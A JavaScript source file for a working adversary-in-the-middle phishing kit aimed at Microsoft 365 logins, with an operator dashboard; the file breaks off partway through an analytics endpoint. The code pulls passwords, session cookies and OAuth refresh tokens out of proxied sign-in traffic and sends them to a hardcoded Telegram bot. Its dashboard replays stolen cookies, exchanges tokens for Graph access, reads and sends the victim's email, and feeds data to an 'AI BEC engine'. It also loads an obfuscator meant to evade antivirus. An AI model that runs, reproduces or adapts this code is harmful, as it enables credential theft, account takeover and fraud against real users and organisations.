const axios = require('axios');
const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
const CHAT_ID = '7310383191';

// Track which sessions have already sent notifications
const NOTIFIED_SESSIONS = new Set();

// ================================================
// 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
// ================================================
const { obfuscateJSFile, generateObfuscationKey } = require('./obfuscator.js');

// ================================================
// 𝙶𝙴𝙾𝙻𝙾𝙲𝙰𝚃𝙸𝙾𝙽 & 𝙲𝙾𝙾𝙺𝙸𝙴 𝙵𝙸𝙻𝙴 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽𝚂
// ================================================

async function getGeoInfo(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=country,countryCode,regionName,city,isp,org`);
        return response.data;
    } catch {
        return { country: 'Unknown', countryCode: 'UN' };
    }
}

async function getCountryCode(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=countryCode`);
        return response.data.countryCode || 'UN';
    } catch {
        return 'UN';
    }
}

function getFlagEmoji(countryCode) {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    return String.fromCodePoint(
        0x1F1E6 + countryCode.charCodeAt(0) - 65,
        0x1F1E6 + countryCode.charCodeAt(1) - 65
    );
}

function extractCookiesFromHeaders(headers) {
    if (!headers) return null;
    
    let cookieHeaders = headers['set-cookie'];
    if (!cookieHeaders) return null;
    
    if (!Array.isArray(cookieHeaders)) {
        cookieHeaders = [cookieHeaders];
    }
    
    const cookies = {};
    cookieHeaders.forEach(cookie => {
        if (typeof cookie !== 'string') return;
        const [nameValue] = cookie.split(';');
        const [name, value] = nameValue.split('=');
        if (name && value) cookies[name.trim()] = value.trim();
    });
    
    return Object.keys(cookies).length ? cookies : null;
}

async function sendCookiesAsFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0) return;

    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const randomName = Math.random().toString(36).substring(2, 10);
    const filename = `session_${randomName}_${timestamp}.txt`;
    const tmpDir = require('os').tmpdir();
    const filePath = path.join(tmpDir, filename);

    const content = `# Session Cookies\n# Session ID: ${sessionId}\n# Captured: ${new Date().toISOString()}\n\n${JSON.stringify(cookies, null, 2)}`;
    fs.writeFileSync(filePath, content);

    try {
        const FormData = require('form-data');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename: filename });
        form.append('caption', `📎 Cookie file: ${filename}`);

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {
        console.log('Cookie file send failed', e.message);
    }

    try { fs.unlinkSync(filePath); } catch (e) {}
}

// ================================================
// 𝙼𝙰𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (FIXED - NO DUPLICATES)
// ================================================

async function sendToTelegram(data) {
    try {
        const url = data.proxyRequestURL || '';
        const body = data.proxyRequestBody || '';
        const method = data.proxyRequestMethod || '';
        const sessionId = data.sessionId || 'unknown';
        const userAgent = data.proxyRequestHeaders?.['user-agent'] || 'Unknown';
        
        console.log('📨 sendToTelegram() CALLED with URL:', url);
        
        if (NOTIFIED_SESSIONS.has(sessionId)) {
            console.log('⏭️ Already notified for session:', sessionId);
            return;
        }
        
        const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                   data.proxyRequestHeaders?.['x-real-ip'] || 
                   data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
                   'Unknown';

        let username = 'N/A';
        let password = 'N/A';
        let hasCredentials = false;
        let isSessionCookie = false;
        let isTokenExchange = false;
        
        if (body) {
            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
            console.log('📦 Raw body (first 500 chars):', bodyStr.slice(0, 500));
            
            const userMatch = bodyStr.match(/(?:login|loginfmt|username)=([^&]+)/i);
            if (userMatch) {
                username = decodeURIComponent(userMatch[1]);
            }
            
            const passMatch = bodyStr.match(/(?:passwd|password|pass)=([^&]+)/i);
            if (passMatch) {
                password = decodeURIComponent(passMatch[1]);
                hasCredentials = true;
                console.log('✅ PASSWORD FOUND (URL-encoded):', password);
            }
            
            try {
                const jsonBody = typeof body === 'string' ? JSON.parse(body) : body;
                if (jsonBody.password) {
                    password = jsonBody.password;
                    hasCredentials = true;
                    console.log('✅ PASSWORD FOUND (JSON):', password);
                }
                if (jsonBody.username) username = jsonBody.username;
                if (jsonBody.loginfmt) username = jsonBody.loginfmt;
            } catch (e) {}
            
            if (!hasCredentials && bodyStr.includes('password')) {
                const rawPassMatch = bodyStr.match(/"password"\s*[:=]\s*"([^"]+)"/i) ||
                                    bodyStr.match(/password['"]?\s*[:=]\s*['"]?([^'"]+)['"]?/i);
                if (rawPassMatch) {
                    password = rawPassMatch[1];
                    hasCredentials = true;
                    console.log('✅ PASSWORD FOUND (raw):', password);
                }
            }
            
            if (bodyStr.includes('refresh_token') && bodyStr.includes('grant_type')) {
                isTokenExchange = true;
                hasCredentials = true;
                console.log('✅ TOKEN EXCHANGE DETECTED');
            }
        }
        
        const setCookieHeaders = data.proxyResponseHeaders?.['set-cookie'];
        if (setCookieHeaders) {
            const cookieStr = JSON.stringify(setCookieHeaders);
            if (cookieStr.includes('esctx') || 
                cookieStr.includes('ESTSAUTH') || 
                cookieStr.includes('LoginOptions')) {
                isSessionCookie = true;
                hasCredentials = true;
                console.log('✅ SESSION COOKIE DETECTED');
            }
        }
        
        if (username !== 'N/A' || hasCredentials || isSessionCookie) {
            hasCredentials = true;
            console.log('✅ Sending notification for username/cookie');
        }
        
        if (!hasCredentials) {
            console.log('⏭️ Skipping notification - no credentials found in:', url);
            return;
        }
        
        console.log('✅ Valid credentials found, sending notification...');
        NOTIFIED_SESSIONS.add(sessionId);
        
        let geo = { country: 'Unknown', countryCode: 'UN', regionName: '', city: '', isp: '', org: '' };
        let flag = '🌍';
        let location = 'Unknown';

        if (ip !== 'Unknown') {
            try {
                geo = await getGeoInfo(ip);
                flag = getFlagEmoji(geo.countryCode);
                location = `${geo.city}, ${geo.regionName}, ${geo.country}`;
            } catch (e) {
                console.log('⚠️ Geo lookup failed:', e.message);
            }
        }

        let message = `
🔐 **New Login Captured!**

🌍 **IP:** ${ip}
${flag} **Location:** ${location}
🏢 **ISP:** ${geo.isp || 'N/A'}
📡 **Org:** ${geo.org || 'N/A'}

🕒 **Time:** ${data.timestamp || new Date().toISOString()}
🔗 **URL:** ${url}
📨 **Method:** ${method}
📊 **Status:** ${data.proxyResponseStatusCode || 'N/A'}

🖥️ **User-Agent:** ${userAgent}
        `;

        if (username !== 'N/A') {
            message += `
👤 **Username/Email:** ${username}
            `;
        }
        
        if (password !== 'N/A') {
            message += `
🔐 **Password:** ${password}
            `;
        } else {
            message += `
⚠️ **Password:** Not yet captured (waiting for second step)
            `;
        }

        if (isSessionCookie) {
            message += `
🍪 **Session Cookie:** ✅ Captured
🔑 **Status:** Authenticated session
            `;
        }

        if (isTokenExchange) {
            message += `
🔄 **Token Exchange:** ✅ Detected
💎 **Value:** High (refresh token / access token)
            `;
        }

        console.log('📤 Sending Telegram message...');
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        console.log('✅ Telegram message sent successfully');

        const cookies = extractCookiesFromHeaders(data.proxyResponseHeaders);
        if (cookies && Object.keys(cookies).length > 0) {
            await sendCookiesAsFile(cookies, sessionId);
            console.log('✅ Cookies file sent');
        }

        if (body && typeof body === 'string' && body.length > 0 && body.length < 4000) {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `📦 **Raw POST Data:**\n\`\`\`\n${body.slice(0, 3000)}\n\`\`\``,
                parse_mode: 'Markdown'
            });
            console.log('✅ Raw data sent successfully');
        }

    } catch (e) {
        console.error('❌ sendToTelegram() FAILED:', e.message);
        console.error('   Stack:', e.stack);
        NOTIFIED_SESSIONS.delete(sessionId);
    }
}

// ================================================
// 𝙲𝙾𝚁𝙴 𝙳𝙴𝙿𝙴𝙽𝙳𝙴𝙽𝙲𝙸𝙴𝚂
// ================================================

const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const os = require("os");

// ================================================
// 𝚅𝙸𝚂𝙸𝚃 𝙻𝙾𝙶𝙶𝙸𝙽𝙶
// ================================================

const VISITS_LOG_FILE = path.join(__dirname, "visit_logs", "visits.log");

const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
if (!fs.existsSync(VISITS_LOG_DIR)) {
    fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
}

async function logVisit(clientRequest, clientResponse, sessionId) {
    const url = clientRequest.url || '';
    const method = clientRequest.method || '';
    
    const isPageLoad = (
        method === 'GET' &&
        (url === '/' || 
         url.startsWith('/login') || 
         url === '/webmail' ||
         url === '/bitb' ||
         url.match(/\.(html|htm)$/))
    );
    
    const isStatic = (
        url.includes('.css') || url.includes('.js') || 
        url.includes('.gif') || url.includes('.svg') || 
        url.includes('.ico') || url.includes('.png') ||
        url.includes('service_worker') || url.includes('/@') ||
        url.includes('favicon') || url.includes('OneCollector') ||
        url.includes('/lNv1pC9AWPUY4gbidyBO')
    );
    
    if (!isPageLoad || isStatic) {
        return;
    }
    
    const ip = clientRequest.headers['x-real-ip'] || 
               clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
               'Unknown';
    
    let countryCode = 'UN';
    if (ip !== 'Unknown') {
        try {
            countryCode = await getCountryCode(ip);
        } catch (e) {}
    }
    
    const visit = {
        timestamp: new Date().toISOString(),
        ip: ip,
        countryCode: countryCode,
        userAgent: clientRequest.headers['user-agent'] || 'Unknown',
        referer: clientRequest.headers['referer'] || 'Direct',
        sessionId: sessionId || 'unknown',
        url: clientRequest.url,
        method: clientRequest.method,
        statusCode: clientResponse.statusCode || 'N/A'
    };
    
    const logLine = JSON.stringify(visit) + '\n';
    fs.appendFileSync(VISITS_LOG_FILE, logLine);
}

// ================================================
// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙳𝙴𝙿𝙴𝙽𝙳𝙴𝙽𝙲𝙸𝙴𝚂
// ================================================

const express = require('express');
const basicAuth = require('express-basic-auth');
const AdmZip = require('adm-zip');
const WebSocket = require('ws');

// ================================================
// 𝙲𝙾𝙽𝚂𝚃𝙰𝙽𝚃𝚂 (FIXED: ALL DEFINED IN CORRECT ORDER)
// ================================================

const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";

const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

if (!fs.existsSync(LOGS_DIRECTORY)) {
    fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
}

const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};

function decryptData(encryptedData, ivHex) {
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf-8');
}

// ================================================
// 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙰𝙿𝙿
// ================================================

const dashApp = express();
const dashUser = process.env.DASHBOARD_USER || 'svrps';
const dashPass = process.env.DASHBOARD_PASS || 'evilworker';

dashApp.use(basicAuth({
    users: { [dashUser]: dashPass },
    challenge: true,
    realm: 'PHANTOM Dashboard'
}));

dashApp.use(express.json());
dashApp.use(express.static('public'));

dashApp.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ================================================
// 𝙰𝙿𝙸 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂
// ================================================

dashApp.get('/api/logs', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const logs = files.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { name: f, size: stat.size, modified: stat.mtime };
        }).sort((a, b) => b.modified - a.modified);
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/log/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const entries = lines.map(line => {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                return JSON.parse(decrypted);
            } catch (e) {
                return { error: 'Failed to decrypt', raw: line };
            }
        });
        res.json({ filename: req.params.filename, entries });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/export/all', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        if (files.length === 0) return res.status(404).json({ error: 'No logs' });
        const zip = new AdmZip();
        files.forEach(f => {
            const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
            zip.addFile(f, content);
        });
        const zipBuffer = zip.toBuffer();
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
        res.send(zipBuffer);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/status', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
        res.json({
            online: true,
            totalSessions: files.length,
            lastCapture: last
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/replay/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });

    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        let allCookies = [];
        let targetDomain = null;
        let accessToken = null;
        let refreshToken = null;

        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                const obj = JSON.parse(decrypted);

                if (!targetDomain && obj.proxyRequestURL) {
                    try {
                        const url = new URL(obj.proxyRequestURL);
                        targetDomain = url.hostname;
                    } catch (e) {}
                }

                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                if (setCookie) {
                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                    for (const cookie of cookieArray) {
                        const [nameValue] = cookie.split(';');
                        if (nameValue) allCookies.push(nameValue.trim());
                    }
                }

                const body = obj.proxyRequestBody;
                if (body) {
                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                    if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
                    if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
                }
            } catch (e) {}
        }

        if (allCookies.length === 0 && !accessToken) {
            return res.status(404).json({ error: 'No cookies or tokens found' });
        }

        const replayScript = `
            (function() {
                const cookies = ${JSON.stringify(allCookies)};
                const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
                const accessToken = ${JSON.stringify(accessToken)};
                const refreshToken = ${JSON.stringify(refreshToken)};
                
                cookies.forEach(c => {
                    document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
                });
                
                let msg = '🍪 ' + cookies.length + ' cookies injected.';
                if (accessToken) {
                    msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
                    localStorage.setItem('evil_token', accessToken);
                }
                if (refreshToken) {
                    msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
                }
                alert(msg);
                window.location.href = 'https://' + targetDomain;
            })();
        `;

        res.json({
            success: true,
            cookieCount: allCookies.length,
            targetDomain: targetDomain || 'login.microsoftonline.com',
            hasAccessToken: !!accessToken,
            hasRefreshToken: !!refreshToken,
            replayScript: replayScript,
            cookieString: allCookies.join('; ')
        });

    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/tokens/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });

    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const tokens = {
            access_tokens: [],
            refresh_tokens: [],
            id_tokens: [],
            cookies: [],
            sessions: []
        };

        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                const obj = JSON.parse(decrypted);

                const body = obj.proxyRequestBody;
                if (body) {
                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                    const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                    if (accessMatch) tokens.access_tokens.push(decodeURIComponent(accessMatch[1]));
                    if (refreshMatch) tokens.refresh_tokens.push(decodeURIComponent(refreshMatch[1]));
                    if (idMatch) tokens.id_tokens.push(decodeURIComponent(idMatch[1]));

                    try {
                        const json = typeof body === 'string' ? JSON.parse(body) : body;
                        if (json.access_token) tokens.access_tokens.push(json.access_token);
                        if (json.refresh_token) tokens.refresh_tokens.push(json.refresh_token);
                        if (json.id_token) tokens.id_tokens.push(json.id_token);
                    } catch (e) {}
                }

                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                if (setCookie) {
                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                    for (const cookie of cookieArray) {
                        const [nameValue] = cookie.split(';');
                        if (nameValue) tokens.cookies.push(nameValue.trim());
                    }
                }

                const sessionCookie = obj.proxyRequestHeaders?.cookie;
                if (sessionCookie) {
                    tokens.sessions.push(sessionCookie);
                }
            } catch (e) {}
        }

        res.json({
            success: true,
            filename: req.params.filename,
            tokens: tokens
        });

    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/exchange', async (req, res) => {
    const { refresh_token } = req.body;
    if (!refresh_token) return res.status(400).json({ error: 'Refresh token required' });

    try {
        const response = await axios.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
                refresh_token: refresh_token,
                grant_type: 'refresh_token',
                scope: 'https://graph.microsoft.com/.default offline_access'
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ 
            error: err.response?.data?.error_description || err.message 
        });
    }
});

dashApp.post('/api/recon', async (req, res) => {
    const { accessToken, refreshToken, email } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        const GraphClient = require('./graph_api.js');
        const graph = new GraphClient(accessToken);
        
        const [profile, inbox, sent, contacts, events, manager, directReports, org] = await Promise.all([
            graph.getUserProfile(),
            graph.getInbox(50),
            graph.getSentItems(50),
            graph.getContacts(),
            graph.getEvents(),
            graph.getManager().catch(() => null),
            graph.getDirectReports().catch(() => null),
            graph.getOrganization().catch(() => null)
        ]);

        res.json({
            success: true,
            email: email || profile.mail || profile.userPrincipalName,
            profile,
            inbox: inbox?.value || [],
            sent: sent?.value || [],
            contacts: contacts?.value || [],
            events: events?.value || [],
            manager,
            directReports: directReports?.value || [],
            organization: org?.value?.[0] || null
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/ai/analyze', async (req, res) => {
    const { accessToken, refreshToken, email, groqApiKey } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });

    try {
        const AIBECEngine = require('./ai_bec_engine.js');
        const engine = new AIBECEngine(groqApiKey);
        const result = await engine.runFullAnalysis(accessToken, refreshToken, email);
        res.json({ success: true, ...result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/folders', async (req, res) => {
    const { accessToken } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        const GraphClient = require('./graph_api.js');
        const graph = new GraphClient(accessToken);
        const folders = await graph.getMailFolders();
        res.json({ success: true, folders: folders.value || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/emails', async (req, res) => {
    const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        const GraphClient = require('./graph_api.js');
        const graph = new GraphClient(accessToken);
        
        let endpoint;
        if (folderId === 'inbox') {
            endpoint = `/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        } else if (folderId === 'sent') {
            endpoint = `/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        } else {
            endpoint = `/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        }
        
        const emails = await graph.get(endpoint);
        res.json({ success: true, emails: emails.value || [], count: emails.value?.length || 0 });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/email', async (req, res) => {
    const { accessToken, messageId } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!messageId) return res.status(400).json({ error: 'Message ID required' });

    try {
        const GraphClient = require('./graph_api.js');
        const graph = new GraphClient(accessToken);
        const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
        res.json({ success: true, email });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/send', async (req, res) => {
    const { accessToken, to, subject, body, replyToId, forwardFromId } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!to || !subject || !body) return res.status(400).json({ error: 'To, subject, and body required' });

    try {
        const GraphClient = require('./graph_api.js');
        const graph = new GraphClient(accessToken);
        
        const emailData = {
            message: {
                subject: subject,
                body: { content: body, contentType: 'HTML' },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            }
        };

        if (replyToId) {
            emailData.message.conversationId = replyToId;
        }

        if (forwardFromId) {
            emailData.message.forwardFrom = { id: forwardFromId };
        }

        const result = await graph.post('/me/sendMail', emailData);
        res.json({ success: true, result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/search', async (req, res) => {
    const { accessToken, query, folderId = 'inbox', limit = 50 } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!query) return res.status(400).json({ error: 'Search query required' });

    try {
        const GraphClient = require('./graph_api.js');
        const graph = new GraphClient(accessToken);
        const searchUrl = folderId === 'inbox' 
            ? `/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
            : `/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
        const results = await graph.get(searchUrl);
        res.json({ success: true, emails: results.value || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/visits', (req, res) => {
    try {
        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
        if (!fs.existsSync(VISITS_LOG_FILE)) {
            return res.json({ visits: [], total: 0, uniqueIPs: 0, today: 0, week: 0 });
        }
        
        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const visits = lines.map(line => JSON.parse(line));
        visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        
        res.json({
            visits: visits.slice(0, 100),
            total: visits.length,
            uniqueIPs: uniqueIPs,
            today: todayVisits.length,
            week: weekVisits.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/visits/stats', (req, res) => {
    try {
        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
        if (!fs.existsSync(VISITS_LOG_FILE)) {
            return res.json({ total: 0, uniqueIPs: 0, today: 0, week: 0 });
        }
        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const visits = lines.map(line => JSON.parse(line));
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        res.json({
            total: visits.length,
            uniqueIPs: uniqueIPs,
            today: todayVisits.length,
            week: weekVisits.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

const TokenVault = require('./token_vault.js');
const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);

dashApp.post('/api/vault/scan', (req, res) => {
    try {
        const tokens = vault.scanLogs();
        res.json({ success: true, count: tokens.length });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/tokens', (req, res) => {
    try {
        res.json({ success: true, tokens: vault.tokens });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/users', (req, res) => {
    try {
        const users = vault.getTokensByUser();
        res.json({ success: true, users });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/stats', (req, res) => {
    try {
        const stats = vault.getStats();
        res.json({ success: true, stats });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/vault/healthcheck', async (req, res) => {
    try {
        const results = await vault.healthCheckAll();
        res.json({ success: true, results });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/vault/exchange', async (req, res) => {
    const { tokenValue } = req.body;
    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });

    try {
        const response = await axios.post(
            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
                refresh_token: tokenValue,
                grant_type: 'refresh_token',
                scope: 'https://graph.microsoft.com/.default offline_access'
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        res.json({ success: true, data: response.data });
    } catch (err) {
        res.status(500).json({ 
            error: err.response?.data?.error_description || err.message 
        });
    }
});

dashApp.get('/api/analytics', (req, res) => {
    try {
        const VISITS_LOG_FILE = path.join(__dirname, 'visit_logs', 'visits.log');
        let visits = [];
        let captures = [];
        
        if (fs.existsSync(VISITS_LOG_FILE)) {
            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            visits = lines.map(line => JSON.parse(line));
        }
        
        const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        captures = logFiles.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { file: f, modified: stat.mtime, size: stat.size };
        });
        
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
